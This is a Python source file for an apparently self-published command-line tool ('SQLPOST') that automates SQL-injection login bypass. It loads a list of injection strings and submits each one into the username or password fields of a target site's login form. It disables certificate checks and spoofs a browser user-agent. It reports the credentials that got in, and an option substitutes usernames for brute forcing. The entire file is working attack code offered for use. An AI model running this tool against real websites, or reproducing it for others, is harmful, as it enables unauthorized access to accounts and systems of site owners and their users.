#!/usr/bin/env python3

import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import os


W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m"   


class MY_SQL_IN:
     def __init__(self):
         self.banner =B+'''
             |________|___________________|_   
             |        |      SQLPOST_     | |    UserName
             |'''+O+''' POST '''+R+'''  | | | | | | | | | | | |%%============='''+O+'''-'''+R+'''
             |________|_'''+B+'''__________________|_|    Password         
             |        |   '''+Y+P+'''@'''+Y+'''jacstory  '''+B+'''     | '''+W    
         print(self.banner)                                 
         self.control()            
         self.read_command()
     def read_command(self):
         try:  
             ssl._create_default_https_context = ssl._create_unverified_context
             if self.args.Code:
                list_command  = open(self.args.Code,'r')   
                list_command  = list_command .readlines()       
             else:
                 list_command  = open("sql",'r')   
                 list_command  = list_command .readlines()   

             for command in list_command :  
                 if self.args.userforce:
                    if "admin" in command:
                        command = str(command.replace('admin',self.args.userforce).replace('\n','').strip())
                    else:
                        command  = str(command.strip())    

                 else:
                    command  = str(command.strip())   
                 url = self.args.URL
                 request = mechanize.Browser()
                 request.set_handle_robots(False)
                 request.set_handle_redirect(True)
                 request.set_handle_refresh(True, max_time=1)
                 request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                 request.set_ca_data(context=ssl._create_unverified_context(cert_reqs=ssl.CERT_NONE))
                 Get_Oregnal_URL = request.open(url).read()        
                 def Command_Exe() :                      
                     if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                     and not self.args.UserInput and not self.args.PassInput:
                       request["username"] = f'{command}'
                       request["password"] = 'password'  
                     elif not self.args.UserForm and  self.args.user and not self.args.PassForm and not self.args.password\
                     and not self.args.UserInput and not self.args.PassInput:                  
                       request[f'username'] = f'{self.args.user}'
                       request["password"] = f'{command}'
                     elif not self.args.UserForm and not self.args.user and  not self.args.PassForm and  self.args.password\
                     and not self.args.UserInput and not self.args.PassInput : 
                       request['username']=f'{command}'
                       request["password"] =f'{self.args.password}'                          
                     elif  self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
                     and not self.args.UserInput and not self.args.PassInput :                        
                       request[f'{self.args.UserForm}'] = f'{command}'  
                       request[f'{self.args.PassForm}'] = 'password'    
                     elif self.args.UserForm and self.args.PassForm and  self.args.user and not self.args.password\
                     and not self.args.UserInput and not self.args.PassInput :   
                       request[f'{self.args.UserForm}'] = f'{self.args.user}'  
                       request[f'{self.args.PassForm}'] = f'{command}'                 
                     elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
                     and not self.args.UserInput and not self.args.PassInput: 
                       request[f'{self.args.UserForm}']=f'{command}'
                       request[f'{self.args.PassForm}']=f'{self.args.password}'   
                     elif self.args.UserForm and self.args.user and not self.args.PassForm and not self.args.password\
                     and not self.args.UserInput and not self.args.PassInput :                 
                       request[f'{self.args.UserForm}'] = f'{self.args.user}'
                       request["password"] =  f'{command}' 
                     elif not self.args.UserForm and self.args.user and self.args.PassForm and not self.args.password\
                     and not self.args.UserInput and not self.args.PassInput:
                        request["username"] = f'{self.args.user}'
                        request[f'{self.args.PassForm}'] = f'{command}'  
                     elif not self.args.UserForm and not self.args.user and not self.args.PassForm and self.args.password\
                     and not self.args.UserInput and not self.args.PassInput: 
                        request["username"] = f'{command}'
                        request["password"] = f'{self.args.password}'
                     elif self.args.UserForm  and self.args.PassForm and self.args.user and not self.args.password\
                     and not self.args.UserInput and not self.args.PassInput:                         
                        request[f'{self.args.UserForm}'] =  f'{self.args.user}'
                        request[f'{self.args.PassForm}']=f'{command}'   
                     elif self.args.UserForm and self.args.PassForm and not  self.args.user and  self.args.password\
                     and not self.args.UserInput and not self.args.PassInput:
                       request[f'{self.args.UserForm}'] =  f'{command}'
                       request[f'{self.args.PassForm}']=f'{self.args.password}'                       
                     elif not self.args.UserForm and self.args.PassForm and not self.args.user and self.args.password\
                     and not self.args.UserInput and not self.args.PassInput:
                       request['username'] =  f'{command}' 
                       request[f'{self.args.PassForm}'] = f'{self.args.password}'                 
                     elif  self.args.UserForm and  not self.args.PassForm and self.args.password  and not self.args.user\
                     and not self.args.UserInput and not self.args.PassInput:
                       request[f'{self.args.UserForm}']=f'{command}'
                       request['password']=f'{self.args.password}'      
                     elif  not self.args.UserForm and  not self.args.PassForm and not  self.args.password  and not self.args.user\
                     and self.args.UserInput and self.args.PassInput :
                       request['username']=f'{command}'
                       request['password']=f'{command}'    
                     elif   self.args.UserForm and  self.args.PassForm and not  self.args.password  and not self.args.user\
                     and self.args.UserInput and self.args.PassInput : 
                          request[f'{self.args.UserForm}'] =  f'{command}'
                          request[f'{self.args.PassForm}']=f'{command}'  
                     elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user :
                         request['username']=f'{self.args.user}'
                         request[f'{self.args.PassForm}']=f'{self.args.password}'                         
                         response   = request.submit()
                         content    = response.read()
                         passlogin  = response.geturl() 
                         Get_URL_Content = request.open(passlogin).read()                        
                         if  Get_URL_Content == Get_Oregnal_URL and not self.args.Error or\
                         self.args.Error and  self.args.Error in str(content):
                               print(B+'[*] '+R+'Login Page  URL   :'+B,url+W )                    
                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
                               print(B+'[*] '+R+'Status            : '+Y+'NOT LOGIN'+W)
                               exit()
                         else:
                               print(B+'[*] '+R+'Login Page  URL   :'+B,passlogin +W )                    
                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
                               print(B+'[*] '+R+'Status            : '+Y+'LOGIN'+W)
                               exit()         
                     elif not self.args.UserForm and not self.args.PassForm and self.args.password  and  self.args.user : 
                         request['username']=f'{self.args.user}'
                         request['password']=f'{self.args.password}'    
                         response   = request.submit()
                         content    = response.read()
                         passlogin  = response.geturl() 
                         Get_URL_Content = request.open(passlogin).read()                        
                         if  Get_URL_Content == Get_Oregnal_URL and not self.args.Error or\
                         self.args.Error and  self.args.Error in str(content):
                               print(B+'[*] '+R+'Login Page  URL   :'+B,url+W )                    
                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
                               print(B+'[*] '+R+'Status            : '+Y+'NOT LOGIN'+W)
                               exit()
                         else:
                               print(B+'[*] '+R+'Login Page  URL   :'+B,passlogin +W )                    
                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
                               print(B+'[*] '+R+'Status            : '+Y+'LOGIN'+W)
                               exit()      
                     else:
                       print(B+'[!] '+R+'Command Not Found'+W)
                       print(B+'[!] '+R+'Plases see the help options to how to use '+W)
                       exit()       
                 try:   
                        
                    request.select_form(nr = 0)
                    Command_Exe()
                 except Exception :
                      try:
                         request.select_form(nr = 1) 
                         Command_Exe()
                      except Exception :   
                           try:
                              request.select_form(nr = 2)
                              Command_Exe()
                           except Exception : 
                                try:
                                  request.select_form(nr = 3)
                                  Command_Exe()
                                except Exception :   
                                    try:
                                      request.select_form(nr = 4)
                                      Command_Exe()
                                    except Exception as D :   
                                        print(B+"[!] "+R+"Error :",str(D)+W)
                                        exit()                                                          
                 response   = request.submit()
                 content    = response.read()
                 passlogin  = response.geturl() 
                 Get_URL_Content = request.open(passlogin).read()    
                 if self.args.Error and self.args.Error in str(content):
                     print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
                     print(B+'[*]'+R+' Login Page  URL          : '+B, url+W )                    
                     print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K')  
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K') 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K') 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K')
                 elif Get_URL_Content == Get_Oregnal_URL  :
                     
                     print(B+'\n[*]'+R+' SLQ Injaction Command    : '+P, command +W)
                     print(B+'[*]'+R+' Login Page  URL          : '+B, url+W )                    
                     print(B+'[*]'+R+' Status                   : '+Y+' NOT LOGIN'+W) 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K')  
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K') 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K') 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K')
                    
                 else: 
                      print(B+'[*] '+'Login URL  : '+R,  passlogin)
                      print(B+'[*] '+'SLQ Injaction Successful  Login ')
                      print(O+'='*30+'\n'+B+'[!] '+R+'Credentials  : - '+O+'\n'+'='* 20+'\n'+W)
                      if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                      and not self.args.UserInput and not self.args.PassInput:
                           print(B+'[+] '+R+'username : '+Y+f'{command}')
                           print(B+'[+] '+R+'Password : '+Y+ 'password')                          
                      elif not self.args.UserForm and  self.args.user and not self.args.PassForm and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput: 
                           print(B+'[+] '+R+'username : '+Y+f'{self.args.user}')
                           print(B+'[+] '+R+'Password : '+Y+ f'{command}')                           
                      elif not self.args.UserForm and not self.args.user and  not self.args.PassForm and  self.args.password\
                      and not self.args.UserInput and not self.args.PassInput :   
                           print(B+'[+] '+R+'username : '+Y+ f'{command}')   
                           print(B+'[+] '+R+'Password : '+Y+ f'{self.args.password}')      
                      elif  self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput :    
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+'password') 
                      elif self.args.UserForm and self.args.PassForm and  self.args.user and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput :
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{self.args.user}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}') 
                      elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
                      and not self.args.UserInput and not self.args.PassInput:
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')  
                      elif self.args.UserForm and self.args.user and not self.args.PassForm and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput :   
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{self.args.user}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')   
                      elif not self.args.UserForm and self.args.user and self.args.PassForm and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput:   
                           print(B+'[+] '+R+'username : '+Y+f'{self.args.user}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}') 
                      elif not self.args.UserForm and not self.args.user and not self.args.PassForm and self.args.password\
                      and not self.args.UserInput and not self.args.PassInput:    
                           print(B+'[+] '+R+'username : '+Y+f'{command}')
                           print(B+'[+] '+R+'password : '+Y+f'{self.args.password}')
                      elif self.args.UserForm  and self.args.PassForm and self.args.user and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput:                  
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+']  :'+Y+f'{self.args.user}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')
                      elif self.args.UserForm and self.args.PassForm and not  self.args.user and  self.args.password\
                      and not self.args.UserInput and not self.args.PassInput:  
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+']  :'+Y+f'{command}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')
                      elif not self.args.UserForm and self.args.PassForm and not self.args.user and self.args.password\
                      and not self.args.UserInput and not self.args.PassInput:     
                           print(B+'[+] '+R+'username : '+Y+f'{command}')
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')
                      elif  self.args.UserForm and  not self.args.PassForm and self.args.password  and not self.args.user\
                      and not self.args.UserInput and not self.args.PassInput:  
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+']  :'+Y+f'{command}')
                           print(B+'[+] '+R+'password : '+Y+f'{self.args.password}')
                      elif  not self.args.UserForm and  not self.args.PassForm and not  self.args.password  and not self.args.user\
                      and self.args.UserInput and self.args.PassInput :      
                           print(B+'[+] '+R+'username : '+Y+f'{command}')
                           print(B+'[+] '+R+'password : '+Y+f'{command}')
                      elif   self.args.UserForm and  self.args.PassForm and not  self.args.password  and not self.args.user\
                      and self.args.UserInput and self.args.PassInput :      
                           print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{command}')    
                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{command}')
                      exit()
                         
             print(B+'[!] '+R+'Web May Not Vulnerable To SQL Injaction '+W)
             print(B+'[*] '+R+'Saugger To Use anther list Command '+W)  
         except urllib.error.URLError:
                 print(B+"[*] "+R+"Bad URL Connection refused"+W)
                 exit()
         except Exception as a :
                print( B+"[#] "+R+"Error : "+Y+str(a)+W )
         except KeyboardInterrupt:
              exit()
       
     def control(self):
        
        print(B+"")
        parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
        parser.add_argument('--URL'        , action=None                   ,help ="target url loign page") 
        parser.add_argument("-c  ","--Code"       , action=None  ,help ="the List of SQL Commands") 
        parser.add_argument("-fu","--UserForm"   , action=None                   ,help =" add name of the HTML Form Login User")
        parser.add_argument("-FP","--PassForm"   , action=None                   ,help ="add name of the HTML Form Login Passord")
        parser.add_argument("-E","--Error"      , action=None                   ,help =" add Error login message to compare it with HTML response ")
        parser.add_argument("-pI","--PassInput"  , action='store_true'           ,help ="use to POST in Password field")
        parser.add_argument("-uI","--UserInput"  , action='store_true'           ,help ="use to POST in user field")
        parser.add_argument("-N","--user"       , action=None                   ,help ="use specific username ")
        parser.add_argument("-P","--password"   , action=None                   ,help ="use specific Passowrd")     
        parser.add_argument("-U", "--userforce", action=None, help="Specify a specific username from a wordlist to brute force")
    
        self.args = parser.parse_args()  
        print(W+"")
        if len(sys.argv)!=1 :
            pass
        else:
            parser.print_help()        
            exit() 
if __name__=='__main__':
   MY_SQL_IN()    
